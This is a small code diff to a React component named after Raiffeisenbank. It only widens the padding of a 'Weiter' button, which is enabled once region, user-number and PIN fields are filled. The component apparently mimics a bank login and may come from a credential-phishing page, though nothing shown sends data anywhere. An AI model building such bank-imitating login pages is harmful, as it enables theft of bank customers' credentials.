@@ -149,7 +149,7 @@ const Raiffeisenbank = () => {
         <div className="flex justify-center">
           <button
             type="button"
-            className="rounded-md bg-[#fbf315] px-12 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
+            className="rounded-md bg-[#fbf315] px-20 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
             disabled={!bundesland || !verfueger || !pin}
           >
             Weiter
